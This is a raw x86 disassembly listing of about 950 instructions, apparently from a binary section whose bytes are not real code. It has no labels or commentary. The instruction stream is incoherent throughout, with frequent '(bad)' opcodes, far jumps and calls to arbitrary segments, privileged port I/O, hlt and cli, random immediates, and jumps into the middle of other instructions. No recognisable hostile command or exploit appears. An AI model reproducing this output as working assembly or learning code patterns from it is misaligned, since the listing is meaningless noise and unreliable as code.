  417a2b:	test   eax,0x3d7bc8c8
  417a30:	enter  0xdf87,0x14
  417a34:	mov    esp,0xbc55e875
  417a39:	pop    edi
  417a3a:	xor    eax,0x401aac68
  417a3f:	dec    ebp
  417a40:	test   al,0x3c
  417a42:	push   edx
  417a43:	(bad)  
  417a44:	outs   dx,DWORD PTR ds:[esi]
  417a45:	jge    0x417aa0
  417a47:	lock mov ebp,0xa7a0e569
  417a4d:	enter  0xc856,0xa7
  417a51:	xchg   ebx,eax
  417a52:	xor    BYTE PTR [edx-0x22],cl
  417a55:	inc    ax
  417a57:	sbb    dl,dh
  417a59:	add    ebx,DWORD PTR [edx-0x91d0820]
  417a5f:	mov    bh,bl
  417a61:	xchg   ebp,eax
  417a62:	dec    esi
  417a63:	clc    
  417a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a65:	(bad)  [ecx]
  417a67:	jmp    0x6466:0x3695bd0e
  417a6e:	push   ebp
  417a6f:	mov    ebx,0x980fdf06
  417a74:	mov    esp,0x15e118bc
  417a79:	(bad)  
  417a7a:	jbe    0x417aec
  417a7c:	cmp    DWORD PTR [ecx],edx
  417a7e:	je     0x417a4a
  417a80:	cmp    edx,DWORD PTR [edx-0x73]
  417a83:	(bad)  
  417a84:	fs push esp
  417a86:	inc    esp
  417a87:	adc    DWORD PTR [ebp+0x6766207a],ebp
  417a8d:	xor    DWORD PTR [ebx+0x70],edi
  417a90:	fcomp  DWORD PTR [ecx+0x3f030ba9]
  417a96:	xor    edx,DWORD PTR [edi+esi*1+0x2b]
  417a9a:	cmp    eax,0x8d7041d2
  417a9f:	dec    ebx
  417aa0:	mov    ecx,0x2646a781
  417aa5:	les    eax,FWORD PTR [eax-0x62]
  417aa8:	pop    ecx
  417aa9:	cld    
  417aaa:	hlt    
  417aab:	or     ah,BYTE PTR [ebx+0x226c5f10]
  417ab1:	adc    edi,DWORD PTR [ebp-0x4c]
  417ab4:	adc    eax,0xc4309d6
  417ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aba:	push   edi
  417abb:	sub    dl,ch
  417abd:	cmc    
  417abe:	cmp    eax,0xa38171ce
  417ac3:	ins    BYTE PTR es:[edi],dx
  417ac4:	pop    edx
  417ac5:	sub    al,0xee
  417ac7:	jno    0x417b42
  417ac9:	inc    ecx
  417aca:	clc    
  417acb:	out    dx,eax
  417acc:	idiv   DWORD PTR [eax]
  417ace:	mov    edi,0x381b31b0
  417ad3:	int    0x60
  417ad5:	(bad)  
  417ad6:	xlat   BYTE PTR ds:[ebx]
  417ad7:	clc    
  417ad8:	aam    0x6c
  417ada:	mov    al,ds:0x13c76486
  417adf:	les    esi,FWORD PTR ds:0xffe54ea4
  417ae5:	lock jg 0x417b14
  417ae8:	test   al,0xd6
  417aea:	aad    0xa0
  417aec:	out    0x14,al
  417aee:	fwait
  417aef:	lods   al,BYTE PTR ds:[esi]
  417af0:	ret    0xa4de
  417af3:	sub    bl,dh
  417af5:	ror    esp,0xe4
  417af8:	scas   al,BYTE PTR es:[edi]
  417af9:	outs   dx,BYTE PTR ds:[esi]
  417afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afb:	mov    ds:0x21537117,eax
  417b00:	outs   dx,DWORD PTR ds:[esi]
  417b01:	mov    edi,0xec1dae82
  417b06:	xor    eax,0xc2f006c2
  417b0b:	ret    0x9515
  417b0e:	mov    ds:0x2185d63,eax
  417b13:	(bad)  [edi]
  417b15:	mov    bl,BYTE PTR [edi+0x20]
  417b18:	adc    eax,0x9ec3bfdd
  417b1d:	sbb    edi,edi
  417b1f:	sbb    DWORD PTR [eax-0x700b28f4],edi
  417b25:	mov    ebx,ebp
  417b27:	mov    esp,0xb22f5362
  417b2c:	call   0x90a5:0x23fea89f
  417b33:	pusha  
  417b34:	lods   al,BYTE PTR ds:[esi]
  417b35:	sub    BYTE PTR [ecx],dh
  417b37:	sub    BYTE PTR [edi],bh
  417b39:	push   ds
  417b3a:	mov    ds:0x617f3185,eax
  417b3f:	sahf   
  417b40:	jb     0x417ae9
  417b42:	fistp  QWORD PTR [edx+0x31]
  417b45:	add    DWORD PTR [ebp-0x44dc3187],ebx
  417b4b:	nop
  417b4c:	mov    ebx,0xa1cf9a57
  417b51:	(bad)  
  417b52:	icebp  
  417b53:	(bad)  
  417b55:	xchg   ecx,eax
  417b56:	cld    
  417b57:	jl     0x417bcf
  417b59:	xor    ebp,edx
  417b5b:	mov    edi,0xaa193442
  417b60:	pop    ebx
  417b61:	jmp    0xcc3d:0xf43fee0
  417b68:	inc    ebx
  417b69:	adc    al,dh
  417b6b:	std    
  417b6c:	ror    BYTE PTR [eax+0x6],1
  417b6f:	ret    
  417b70:	pusha  
  417b71:	adc    al,0x61
  417b73:	mov    eax,0xb235bb99
  417b78:	outs   dx,DWORD PTR ds:[esi]
  417b79:	lahf   
  417b7a:	fld    TBYTE PTR [eax-0x68]
  417b7d:	xchg   ebp,eax
  417b7e:	mov    DWORD PTR [esi],edx
  417b80:	test   BYTE PTR [ebp-0x26],0x92
  417b84:	push   ss
  417b85:	stc    
  417b86:	pushf  
  417b87:	cmc    
  417b88:	and    dl,BYTE PTR [ebp+0x52]
  417b8b:	pop    esi
  417b8c:	das    
  417b8d:	popa   
  417b8e:	inc    esp
  417b8f:	aam    0x9f
  417b91:	push   esi
  417b92:	adc    eax,0x6fa3e523
  417b97:	or     dl,ch
  417b99:	repz inc ebx
  417b9b:	pop    eax
  417b9c:	cmp    dh,al
  417b9e:	and    DWORD PTR [edx],edi
  417ba0:	mov    al,0x2f
  417ba2:	leave  
  417ba3:	jmp    0x417b8c
  417ba5:	mov    ebp,ebp
  417ba7:	out    dx,al
  417ba8:	outs   dx,BYTE PTR ds:[esi]
  417ba9:	jae    0x417b7c
  417bab:	sbb    al,0xab
  417bad:	call   0x3b7167cd
  417bb2:	call   0x53433726
  417bb7:	dec    ch
  417bb9:	enter  0x1daf,0xe2
  417bbd:	or     DWORD PTR [edi*4-0x237070a6],edx
  417bc4:	push   ss
  417bc5:	inc    ebx
  417bc6:	fwait
  417bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bc8:	ja     0x417bc8
  417bca:	(bad)  
  417bcb:	adc    bh,bl
  417bcd:	push   ebx
  417bce:	sbb    eax,DWORD PTR [ecx+esi*1-0x11b40de1]
  417bd5:	out    0x1e,eax
  417bd7:	mov    BYTE PTR [edx-0x6573b8b9],cl
  417bdd:	adc    dl,BYTE PTR [esi+0x7]
  417be0:	mov    esi,DWORD PTR [eax]
  417be2:	push   edi
  417be3:	loopne 0x417ba5
  417be5:	les    edi,FWORD PTR [eax]
  417be7:	loop   0x417bd4
  417be9:	mov    ecx,0xda7977ad
  417bee:	inc    ecx
  417bef:	cmp    esi,esi
  417bf1:	push   es
  417bf2:	jbe    0x417c32
  417bf4:	xchg   edx,eax
  417bf5:	cmp    al,0x64
  417bf7:	in     eax,0x80
  417bf9:	mov    ds:0x90b80083,eax
  417bfe:	outs   dx,BYTE PTR ds:[esi]
  417bff:	repnz into 
  417c01:	sbb    al,BYTE PTR [edi]
  417c03:	ins    DWORD PTR es:[edi],dx
  417c04:	dec    ebx
  417c05:	rcr    DWORD PTR [ecx+ecx*1+0x1b978481],0xa3
  417c0d:	scas   eax,DWORD PTR es:[edi]
  417c0e:	loop   0x417bd1
  417c10:	ror    DWORD PTR [eax+0x431adc23],0x25
  417c17:	imul   ebx,DWORD PTR [edx],0x3a
  417c1a:	jmp    0x417c60
  417c1c:	adc    ebp,esi
  417c1e:	out    0xec,eax
  417c20:	loopne 0x417c6f
  417c22:	gs push cs
  417c24:	mov    edx,0xc7aa5f5d
  417c29:	mov    eax,ds:0xd24ac9b7
  417c2e:	daa    
  417c2f:	loop   0x417c88
  417c31:	jecxz  0x417bdd
  417c33:	(bad)  [esi-0x4d]
  417c36:	fstp   QWORD PTR [ecx-0x69f26c2d]
  417c3c:	stc    
  417c3d:	push   es
  417c3e:	lods   eax,DWORD PTR ds:[esi]
  417c3f:	loopne 0x417c6f
  417c41:	imul   edi,DWORD PTR [eax-0x4],0xf2c28570
  417c48:	jle    0x417cb9
  417c4a:	adc    eax,0x4f0e7db2
  417c4f:	xor    al,0xa2
  417c51:	ret    
  417c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c53:	push   esi
  417c54:	pop    esi
  417c55:	repz xor BYTE PTR [ebx],dl
  417c58:	mov    esp,0x8326e30
  417c5d:	mov    BYTE PTR [eax-0x4e4f2636],ah
  417c63:	ret    
  417c64:	fidivr DWORD PTR [ebx]
  417c66:	test   ah,bh
  417c68:	jmp    0x7e7d36a4
  417c6d:	mov    ah,0xf9
  417c6f:	stc    
  417c70:	cmp    BYTE PTR [esp+ecx*1+0x6a],ah
  417c74:	loope  0x417c83
  417c76:	pushf  
  417c77:	sbb    edi,0xffffffb5
  417c7a:	dec    edi
  417c7b:	fdivrp st(4),st
  417c7d:	fist   WORD PTR [ecx+esi*1+0x27]
  417c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c83:	mov    ebp,0xcf295406
  417c88:	xor    esi,DWORD PTR [ebx+0x5c924b7]
  417c8e:	mov    cl,0xa1
  417c90:	out    dx,eax
  417c91:	jle    0x417c6a
  417c93:	cld    
  417c94:	xchg   edx,esi
  417c96:	push   es
  417c97:	mov    cs,ebx
  417c99:	pusha  
  417c9a:	das    
  417c9b:	pusha  
  417c9c:	sub    dh,BYTE PTR [ebp-0x6ed7aa6a]
  417ca2:	idiv   DWORD PTR [esi]
  417ca4:	mul    BYTE PTR [edi-0x2f]
  417ca7:	ins    DWORD PTR es:[edi],dx
  417ca8:	cmc    
  417ca9:	je     0x417cb8
  417cab:	add    al,0xdb
  417cad:	call   0x40c82b1c
  417cb2:	das    
  417cb3:	ss mov al,0x43
  417cb6:	out    0x1a,eax
  417cb8:	cli    
  417cb9:	pop    edx
  417cba:	jle    0x417d09
  417cbc:	into   
  417cbd:	loope  0x417d22
  417cbf:	inc    eax
  417cc0:	outs   dx,DWORD PTR ds:[esi]
  417cc1:	cmp    ch,BYTE PTR [eax+0x37]
  417cc4:	loope  0x417ca5
  417cc6:	ds cdq 
  417cc8:	(bad)  
  417cc9:	xchg   edx,eax
  417cca:	adc    DWORD PTR [ecx+0x47],esp
  417ccd:	sbb    BYTE PTR [ecx-0x2c9904c8],0x5b
  417cd4:	into   
  417cd5:	mov    ah,0x53
  417cd7:	add    DWORD PTR [ebx+0x5b],esp
  417cda:	cdq    
  417cdb:	dec    eax
  417cdc:	inc    ebp
  417cdd:	pop    esp
  417cde:	mov    eax,ds:0x4aceafd7
  417ce3:	mov    esp,0x618faa90
  417ce8:	xor    bl,BYTE PTR [eax+0x5a]
  417ceb:	sahf   
  417cec:	jmp    0x417d15
  417cee:	sahf   
  417cef:	adc    eax,0x5f166a6a
  417cf4:	push   esp
  417cf5:	sahf   
  417cf6:	(bad)  
  417cf7:	std    
  417cf8:	fcom   QWORD PTR ds:0x9bb6c273
  417cfe:	mov    esp,0xf1a6a967
  417d03:	(bad)  
  417d04:	cmc    
  417d05:	push   ds
  417d06:	arpl   si,dx
  417d08:	dec    ecx
  417d09:	jp     0x417c8b
  417d0b:	and    DWORD PTR [esi-0x37fbf2d5],eax
  417d11:	test   eax,0xac3e7ded
  417d16:	xchg   ecx,eax
  417d17:	jg     0x417ca2
  417d19:	adc    eax,0xd3a8f610
  417d1e:	mov    al,ds:0xe64453e2
  417d23:	pop    eax
  417d24:	(bad)  
  417d25:	int3   
  417d26:	jp     0x417d72
  417d28:	out    dx,eax
  417d29:	pop    esi
  417d2a:	pop    ecx
  417d2b:	sbb    dh,BYTE PTR [edx-0x1b]
  417d2e:	mov    esp,0x63a51964
  417d33:	push   cs
  417d34:	arpl   WORD PTR [edi-0x66],si
  417d37:	pop    ebp
  417d38:	rcl    BYTE PTR [esi],0xfd
  417d3b:	rcr    BYTE PTR [ecx-0x2],0xd9
  417d3f:	push   0x357eec12
  417d44:	in     al,0xec
  417d46:	pusha  
  417d47:	dec    ecx
  417d48:	leave  
  417d49:	mov    edx,0x65c7e286
  417d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d4f:	push   0x8f97aa43
  417d54:	out    dx,eax
  417d55:	mov    BYTE PTR [ebp+0x56520836],al
  417d5b:	fild   WORD PTR [esi]
  417d5d:	mov    cl,0xca
  417d5f:	fild   WORD PTR [eax+0x731d454f]
  417d65:	xchg   ebp,eax
  417d66:	pushf  
  417d67:	fnstenv [esi+0x502dfb96]
  417d6d:	loopne 0x417ddb
  417d6f:	fisubr WORD PTR [ebx-0x16]
  417d72:	ds inc esi
  417d74:	lock test edi,ecx
  417d77:	retf   0x7f92
  417d7a:	cli    
  417d7b:	xor    bl,BYTE PTR [ecx+0x3b09e261]
  417d81:	cmp    eax,DWORD PTR [ecx+0x5ddba07]
  417d87:	sbb    edi,DWORD PTR [edi-0x13]
  417d8a:	lds    eax,FWORD PTR [ebp-0x2900518b]
  417d90:	jo     0x417d6a
  417d92:	sete   dl
  417d95:	pop    eax
  417d96:	push   es
  417d97:	(bad)  
  417d98:	sahf   
  417d99:	ret    
  417d9a:	div    BYTE PTR [ecx+edi*2+0x7102add4]
  417da1:	sub    edx,DWORD PTR [esi+0x48c41f54]
  417da7:	shl    bl,cl
  417da9:	cli    
  417daa:	pop    ds
  417dab:	sbb    eax,0xc8681a10
  417db0:	nop
  417db1:	stos   DWORD PTR es:[edi],eax
  417db2:	sbb    BYTE PTR [esi+0x1f3ca8e5],dl
  417db8:	mov    bl,0x39
  417dba:	jp     0x417db3
  417dbc:	pop    ebx
  417dbd:	(bad)  
  417dbe:	in     eax,dx
  417dbf:	cmp    DWORD PTR [esi],0xffffff85
  417dc2:	stc    
  417dc3:	mov    DWORD PTR [edi],0x4f38f57d
  417dc9:	add    eax,0x225adb45
  417dce:	sub    BYTE PTR [esp+ebx*8+0x2e],0x22
  417dd3:	and    DWORD PTR [eax+ebx*1+0xa],edi
  417dd7:	xchg   esp,eax
  417dd8:	and    eax,0x869fe80e
  417ddd:	push   eax
  417dde:	jnp    0x417dbd
  417de0:	ss push cs
  417de2:	xor    al,0x7
  417de4:	cld    
  417de5:	iret   
  417de6:	sbb    al,0xe
  417de8:	fwait
  417de9:	in     al,0xc5
  417deb:	not    DWORD PTR [edx+ecx*2-0x37]
  417def:	xor    eax,0x36428c4e
  417df4:	mov    ds:0x781f36b6,eax
  417df9:	fcom   QWORD PTR [ebx-0x37]
  417dfc:	popf   
  417dfd:	jge    0x417e0d
  417dff:	std    
  417e00:	mov    eax,ds:0x734cfafc
  417e05:	push   esi
  417e06:	retf   
  417e07:	(bad)  
  417e08:	fld    DWORD PTR [esp+ecx*4+0x59]
  417e0c:	jno    0x417da3
  417e0e:	adc    al,0x2
  417e10:	sti    
  417e11:	ret    0x667c
  417e14:	imul   DWORD PTR [ebx+0x7a]
  417e17:	or     eax,0x7db8a84e
  417e1c:	gs inc esi
  417e1e:	js     0x417dbd
  417e20:	(bad)  
  417e21:	jbe    0x417e9a
  417e23:	hlt    
  417e24:	aad    0xfd
  417e26:	ins    DWORD PTR es:[edi],dx
  417e27:	sbb    BYTE PTR [ecx],0x70
  417e2a:	adc    al,0x42
  417e2c:	stos   DWORD PTR es:[edi],eax
  417e2d:	fidivr WORD PTR [edx+ecx*4-0x632f240d]
  417e34:	cmp    al,0x4f
  417e36:	xchg   DWORD PTR [edx],ebp
  417e38:	jb     0x417e1e
  417e3a:	fs leave 
  417e3c:	test   BYTE PTR [edx+0x55],dh
  417e3f:	lds    edi,FWORD PTR [esi]
  417e41:	cmc    
  417e42:	mov    edi,0x246afd60
  417e47:	fwait
  417e48:	adc    DWORD PTR ds:0xc8f8e0a7,ebp
  417e4e:	xchg   esi,eax
  417e4f:	jmp    0x1429:0xa417b130
  417e56:	mov    bl,0xe8
  417e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e59:	jmp    0x417dea
  417e5b:	(bad)  
  417e5c:	mov    bl,0x4e
  417e5e:	mov    dh,BYTE PTR [ebx-0x3904947e]
  417e64:	pop    es
  417e65:	mov    ebp,0x8520a474
  417e6a:	in     al,0x1c
  417e6c:	arpl   WORD PTR [ebx],cx
  417e6e:	mov    ebx,0x2178b4cf
  417e73:	jp     0x417e27
  417e75:	xor    BYTE PTR [ecx+0x70],dh
  417e78:	push   ds
  417e79:	cmp    al,0x97
  417e7b:	lods   eax,DWORD PTR ds:[esi]
  417e7c:	dec    eax
  417e7d:	xlat   BYTE PTR ds:[ebx]
  417e7e:	int    0x38
  417e80:	fs das 
  417e82:	out    dx,eax
  417e83:	pop    esp
  417e84:	and    eax,0x494fbc1c
  417e89:	sub    ch,BYTE PTR [edx]
  417e8b:	push   edi
  417e8c:	sbb    al,0x40
  417e8e:	adc    BYTE PTR [eax-0x3],dh
  417e91:	xchg   ax,ax
  417e93:	and    ecx,edx
  417e95:	dec    ebp
  417e96:	inc    ecx
  417e97:	int3   
  417e98:	sub    BYTE PTR [esi-0x1f],0x1d
  417e9c:	cs jmp 0xce52:0x5680b5a5
  417ea4:	inc    ecx
  417ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea6:	dec    esp
  417ea7:	(bad)  
  417ea8:	sti    
  417ea9:	push   0xbfd3b159
  417eae:	fcomp  QWORD PTR [esi+0x3f31342b]
  417eb4:	pop    ebx
  417eb5:	inc    esi
  417eb6:	push   edi
  417eb7:	or     eax,0x899f2ca6
  417ebc:	jae    0x417e8d
  417ebe:	(bad)  
  417ec0:	cmc    
  417ec1:	push   ds
  417ec2:	sub    DWORD PTR [esi-0x6b],edx
  417ec5:	dec    ebx
  417ec6:	sbb    edi,DWORD PTR [edi+0x54efd50b]
  417ecc:	xor    ecx,edx
  417ece:	out    dx,al
  417ecf:	or     eax,0xdd008160
  417ed4:	mov    bl,ch
  417ed6:	xchg   ebp,eax
  417ed7:	and    dh,BYTE PTR [edi+0x52]
  417eda:	sub    ch,BYTE PTR [esi-0x3d0bb749]
  417ee0:	dec    ecx
  417ee1:	leave  
  417ee2:	and    BYTE PTR [edi],al
  417ee4:	stos   DWORD PTR es:[edi],eax
  417ee5:	ret    
  417ee6:	leave  
  417ee7:	sub    DWORD PTR [edi],eax
  417ee9:	fwait
  417eea:	ds (bad) 
  417eec:	mov    edi,0x79f35717
  417ef1:	dec    esi
  417ef2:	pop    ebx
  417ef3:	sub    eax,0xc5947aac
  417ef8:	inc    ecx
  417ef9:	addr16 out dx,al
  417efb:	mov    ecx,0x8ced95f9
  417f00:	stos   BYTE PTR es:[edi],al
  417f01:	repnz add DWORD PTR [ecx-0x16275535],0xa93c18a3
  417f0c:	int    0xec
  417f0e:	loopne 0x417f16
  417f10:	xor    BYTE PTR [eax],bh
  417f12:	mov    bh,0xb2
  417f14:	sub    BYTE PTR [ebp-0x5a],0xfe
  417f18:	out    dx,al
  417f19:	sub    dh,BYTE PTR [esp+eax*4-0x1e]
  417f1d:	or     ah,ah
  417f1f:	add    ebx,DWORD PTR [esi]
  417f21:	xchg   edx,eax
  417f22:	push   edi
  417f23:	add    DWORD PTR [esi-0x7f],edi
  417f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f27:	xchg   edx,eax
  417f28:	mov    ebp,0x70ee5e8b
  417f2d:	xor    ah,dl
  417f2f:	xchg   edx,eax
  417f30:	out    dx,al
  417f31:	inc    ebx
  417f32:	outs   dx,DWORD PTR ss:[esi]
  417f34:	xor    eax,0xb565e181
  417f39:	xor    al,0xcb
  417f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f3c:	or     eax,0xed3c0be7
  417f41:	xchg   ebx,eax
  417f42:	or     DWORD PTR [edx+0x10],edx
  417f45:	cmp    cl,ah
  417f47:	ss icebp 
  417f49:	dec    esp
  417f4a:	js     0x417fb7
  417f4c:	stos   DWORD PTR es:[edi],eax
  417f4d:	cld    
  417f4e:	mov    ds:0x35c7eb7c,eax
  417f53:	pop    eax
  417f54:	(bad)  
  417f55:	mov    bl,0xf6
  417f57:	cmp    ecx,DWORD PTR ds:[ebx+0x0]
  417f5b:	(bad)  
  417f5c:	in     al,dx
  417f5d:	jg     0x417eed
  417f5f:	rcl    BYTE PTR [edx],1
  417f61:	cmp    bh,BYTE PTR ds:0xdfd70c63
  417f67:	jmp    0x229:0x14f34d95
  417f6e:	push   ebx
  417f6f:	add    ebp,DWORD PTR [esi]
  417f71:	jae    0x417fe0
  417f73:	jg     0x417fef
  417f75:	dec    ebx
  417f76:	xor    DWORD PTR [ecx+0xa0c8999],eax
  417f7c:	scas   eax,DWORD PTR es:[edi]
  417f7d:	repz push edx
  417f7f:	and    al,0x47
  417f81:	ins    BYTE PTR es:[edi],dx
  417f82:	mov    eax,ds:0xa42d4c0f
  417f87:	inc    esp
  417f88:	clc    
  417f89:	int3   
  417f8a:	test   al,0x1f
  417f8c:	xchg   edx,eax
  417f8d:	in     eax,dx
  417f8e:	cmp    esi,DWORD PTR [esi+ebx*8+0x4bfd86b1]
  417f95:	sbb    dh,dh
  417f97:	out    0x1a,eax
  417f99:	fs cmc 
  417f9b:	retf   
  417f9c:	jmp    0x71e0:0x59225a1f
  417fa3:	loope  0x417ff2
  417fa5:	pop    edi
  417fa6:	add    DWORD PTR [edx+0x5c],ebp
  417fa9:	icebp  
  417faa:	jb     0x418028
  417fac:	sti    
  417fad:	push   edi
  417fae:	jmp    0x417f86
  417fb0:	popa   
  417fb1:	nop
  417fb2:	enter  0x383f,0xcb
  417fb6:	push   0x4d
  417fb8:	xchg   DWORD PTR [esi-0x200f3627],ebx
  417fbe:	add    eax,0x60708824
  417fc3:	jno    0x417fa4
  417fc5:	sar    DWORD PTR [eax],0xb0
  417fc8:	jecxz  0x417f76
  417fca:	xchg   ecx,eax
  417fcb:	mov    dl,0x43
  417fcd:	adc    al,0x6c
  417fcf:	in     eax,0xab
  417fd1:	add    dh,BYTE PTR [esi-0x1a]
  417fd4:	jbe    0x417f74
  417fd6:	inc    ebp
  417fd7:	lds    esp,FWORD PTR [edi]
  417fd9:	sub    BYTE PTR [esi],ch
  417fdb:	adc    al,0x53
  417fdd:	push   ebx
  417fde:	mov    ebx,0x7b672baf
  417fe3:	(bad)
  417fe6:	inc    ebx
  417fe7:	cld    
  417fe8:	cmp    al,0xc5
  417fea:	adc    dl,cl
  417fec:	stc    
  417fed:	adc    eax,0x6e084419
  417ff2:	sub    BYTE PTR [esi],0xd7
  417ff5:	call   0x51707865
  417ffa:	adc    al,0x49
  417ffc:	push   edi
  417ffd:	je     0x417fce
  417fff:	nop
  418000:	scas   al,BYTE PTR es:[edi]
  418001:	inc    edi
  418003:	lods   al,BYTE PTR fs:[esi]
  418005:	ret    0xe2bd
  418008:	fld    DWORD PTR [edx]
  41800a:	ja     0x417ff5
  41800c:	hlt    
  41800d:	mov    bl,0x57
  41800f:	xlat   BYTE PTR ds:[ebx]
  418010:	inc    edi
  418011:	inc    ebp
  418012:	inc    esi
  418013:	lahf   
  418014:	sub    eax,0x5977244b
  418019:	fnstenv [ebx]
  41801b:	ret    0x8206
  41801e:	loopne 0x418049
  418020:	sbb    ebx,DWORD PTR [esi+0x19cc2607]
  418026:	(bad)  
  418027:	cli    
  418028:	mov    cl,0xe3
  41802a:	jbe    0x417fdd
  41802c:	aaa    
  41802d:	jnp    0x417faf
  41802f:	fnsave [edi+edi*8-0x3a15e807]
  418036:	mov    ecx,0x5f558235
  41803b:	mov    dh,0x17
  41803d:	and    esp,DWORD PTR [ecx]
  41803f:	xchg   ecx,eax
  418040:	sbb    ebp,edi
  418042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418043:	cmp    DWORD PTR [ebp+0x79],ecx
  418046:	ins    DWORD PTR es:[edi],dx
  418047:	(bad)  
  418048:	out    dx,al
  418049:	push   0x4b
  41804b:	outs   dx,DWORD PTR ds:[esi]
  41804c:	enter  0x343d,0x40
  418050:	stc    
  418051:	push   edx
  418052:	aad    0xf3
  418054:	jns    0x418078
  418056:	aas    
  418057:	loop   0x4180ab
  418059:	pushf  
  41805a:	xchg   edx,eax
  41805b:	push   eax
  41805c:	mov    bh,0xbe
  41805e:	das    
  41805f:	aam    0xe3
  418061:	push   eax
  418062:	push   edi
  418063:	std    
  418064:	mov    al,0x67
  418066:	sub    ch,bh
  418068:	pop    ebx
  418069:	mov    eax,0xb0d6980
  41806e:	jae    0x418005
  418070:	mov    ch,0xa8
  418072:	out    dx,al
  418073:	cmp    eax,0xffa29c8
  418078:	inc    ebx
  418079:	repnz popa 
  41807b:	cmp    eax,DWORD PTR [esi+0x7f]
  41807e:	iret   
  41807f:	mov    ch,BYTE PTR [edx-0x3b]
  418082:	lods   al,BYTE PTR ds:[esi]
  418083:	loopne 0x4180bf
  418085:	stos   BYTE PTR es:[edi],al
  418086:	inc    ebx
  418087:	pop    ss
  418088:	sub    al,0x9d
  41808a:	dec    ebx
  41808b:	das    
  41808c:	adc    al,0x80
  41808e:	xchg   ebp,eax
  41808f:	bswap  esi
  418091:	rcl    BYTE PTR [ecx-0x2fc16e26],cl
  418097:	ds mov bl,0x4
  41809a:	test   DWORD PTR [edx-0x5f3b7056],0xd0cc455f
  4180a4:	adc    bh,BYTE PTR [edi]
  4180a6:	dec    edx
  4180a7:	cld    
  4180a8:	bound  edx,QWORD PTR [eax+0x1a]
  4180ab:	mov    cl,0x6b
  4180ad:	daa    
  4180ae:	fmulp  st(7),st
  4180b0:	fidiv  WORD PTR [eax]
  4180b2:	icebp  
  4180b3:	mov    eax,ds:0x86f289ba
  4180b8:	sbb    bl,0xc3
  4180bb:	dec    esi
  4180bc:	sub    BYTE PTR [eax+0x29],dl
  4180bf:	mov    ebp,0x1cdcfa06
  4180c4:	mov    ecx,0x29bd5014
  4180c9:	cmc    
  4180ca:	jg     0x418142
  4180cc:	pop    ss
  4180cd:	xor    al,cl
  4180cf:	test   eax,0x84c21623
  4180d4:	(bad)  
  4180d5:	arpl   si,si
  4180d7:	mov    edx,0xc6066979
  4180dc:	aaa    
  4180dd:	jecxz  0x418078
  4180df:	adc    DWORD PTR [eax-0x31],esi
  4180e2:	sbb    BYTE PTR [eax],dl
  4180e4:	int    0x55
  4180e6:	mov    ch,0x45
  4180e8:	xlat   BYTE PTR ds:[ebx]
  4180e9:	mov    ch,0x62
  4180eb:	and    ecx,edi
  4180ed:	add    ebp,0x5adde46c
  4180f3:	dec    ebp
  4180f4:	sub    al,0x64
  4180f6:	call   0x4129:0xec2b0426
  4180fd:	int3   
  4180fe:	dec    ecx
  4180ff:	outs   dx,BYTE PTR ds:[esi]
  418100:	mov    ebp,0x974528f7
  418105:	sub    al,0x4f
  418107:	jge    0x41813f
  418109:	aaa    
  41810a:	pop    si
  41810c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41810d:	(bad)  
  41810f:	or     bl,BYTE PTR [ebx-0x16aeb812]
  418115:	shr    BYTE PTR [ecx],0xe8
  418118:	dec    ecx
  418119:	icebp  
  41811a:	dec    edx
  41811b:	push   ss
  41811c:	xlat   BYTE PTR ds:[ebx]
  41811d:	or     ecx,DWORD PTR [edx-0x38]
  418120:	add    ah,dh
  418122:	xor    BYTE PTR [eax],cl
  418124:	add    eax,0xde4fb2ac
  418129:	jge    0x41817f
  41812b:	sub    dl,BYTE PTR [esp-0x58]
  41812f:	in     al,0x2d
  418131:	xchg   DWORD PTR [edx],edx
  418133:	scas   eax,DWORD PTR es:[edi]
  418134:	cmc    
  418135:	push   0x2eba3fb2
  41813a:	push   0xffffffde
  41813c:	lods   al,BYTE PTR ds:[esi]
  41813d:	xchg   edi,eax
  41813e:	jno    0x418144
  418140:	push   ecx
  418141:	scas   al,BYTE PTR es:[edi]
  418142:	mov    al,ds:0xecefeae8
  418147:	jmp    0x9c5c4c07
  41814c:	ja     0x4181c0
  41814e:	adc    eax,0x6b24ee54
  418153:	cmp    DWORD PTR [edx+0x54d7dda9],ecx
  418159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41815a:	mov    ch,0xd6
  41815c:	arpl   WORD PTR [edx-0x569d42dd],bp
  418162:	stc    
  418163:	loope  0x418197
  418165:	in     al,0xb1
  418167:	push   ebp
  418168:	(bad)  
  418169:	or     al,0x8e
  41816b:	ss sbb eax,0xdd48d6e6
  418171:	pop    edx
  418172:	sbb    DWORD PTR [ebx-0x7e],eax
  418175:	jl     0x418156
  418177:	test   DWORD PTR [esi+eax*1+0x3e99a6e4],0x7280e997
  418182:	in     al,0xf1
  418184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418185:	mov    dl,0x9b
  418187:	lahf   
  418188:	dec    esi
  418189:	pop    ds
  41818a:	inc    ebp
  41818b:	cwde   
  41818c:	push   ebx
  41818d:	fst    DWORD PTR [ebp-0x24]
  418190:	jl     0x418151
  418192:	in     eax,0xcc
  418194:	aad    0xd1
  418196:	xor    eax,0x3220489
  41819b:	push   esi
  41819c:	or     esp,edi
  41819e:	(bad)  
  4181a0:	pop    esi
  4181a1:	push   ecx
  4181a2:	imul   ecx,ebx,0x4bf19de6
  4181a8:	push   ebx
  4181a9:	daa    
  4181aa:	sub    esp,DWORD PTR [eax+0x4314bb11]
  4181b0:	rcl    DWORD PTR [ecx-0x588e3d81],1
  4181b6:	test   eax,0xf7ffa198
  4181bb:	aaa    
  4181bc:	call   0x90c2:0x3e975b3
  4181c3:	pop    ss
  4181c4:	inc    eax
  4181c5:	jmp    0x418163
  4181c7:	add    esp,esi
  4181c9:	jbe    0x4181ad
